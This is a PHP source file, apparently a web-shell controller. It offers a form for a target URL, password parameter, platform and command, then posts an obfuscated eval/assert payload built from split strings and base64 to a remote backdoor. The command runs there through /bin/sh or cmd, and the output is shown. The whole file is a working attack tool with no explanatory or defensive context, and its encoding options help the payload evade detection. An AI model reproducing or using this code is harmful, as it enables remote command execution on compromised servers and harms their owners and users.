<?php
$url=$_POST["url"];
$platform=$_POST['pl'];
$cmd = $_POST['cmd'];
$encry = $_POST['encry'];
$passwd = $_POST['passwd'];
$command = <<<BEGIN
\$flag=$platform;if(strtolower(\$flag)=="l"){\$p='/bin/sh';}elseif(strtolower(\$flag)=="w"){\$p='cmd';}\$s = '$cmd';\$d = dirname(\$_SERVER["SCRIPT_FILENAME"]);\$c = substr(\$d, 0, 1) == "/" ? "-c \"{\$s}\"" : "/c \"{\$s}\"";\$r = "{\$p} {\$c}";\$array = array(array("pipe", "r"),array("pipe", "w"), array("pipe", "w"));\$fp = proc_open(\$r . " 2>&1", \$array, \$pipes);\$ret = stream_get_contents(\$pipes[1]);proc_close(\$fp);print \$ret;;die();
BEGIN;
$command_base64 = base64_encode($command);
$postdata = <<<BEGIN
array_map("ass"."ert",array("ev"."Al(\"\\\\\\\$xx=\\\\\"Ba"."SE6"."4_dEc"."OdE\\\\\";@ev"."al(\\\\\\\$xx('$command_base64'));\");"));
BEGIN;
switch ($encry){
case 1:
    $postdata=$postdata;
    break;
case 2:
    $postdata=base64_encode($postdata);
    break;
case 3:
    $postdata=convert_uuencode($postdata);
    break;
}
$fields=array(
        $passwd=>$postdata,
);
$ch=curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_POST,count($fields));
curl_setopt($ch,CURLOPT_POSTFIELDS,$fields);
ob_start();
curl_exec($ch);
$result=ob_get_contents();
$result=str_replace(PHP_EOL,'<br>',$result);
ob_end_clean();
curl_close($ch);
?>
<html>
<body>
<form action="" method="post" >
URL:<input type="url" name="url" size = "29" value=<?php echo $url;?>>
<br>
Passwd:<input type="text" name="passwd" size = "10" value=<?php echo $passwd;?>>
<br>
Platform:
<input type="radio" name="pl" value="l" checked>Linux
<input type="radio" name="pl" value="w">Windows
<br>
Encryption:
<input type="radio" name="encry" value="1" checked>None
<input type="radio" name="encry" value="2">Base64
<input type="radio" name="encry" value="3">UUencode
<br>
Command: <input type="text" name="cmd"><br>
<input type="submit" value="Exec">
</form>
<div>
<?php echo $result?>
</div>
</body>
</html>
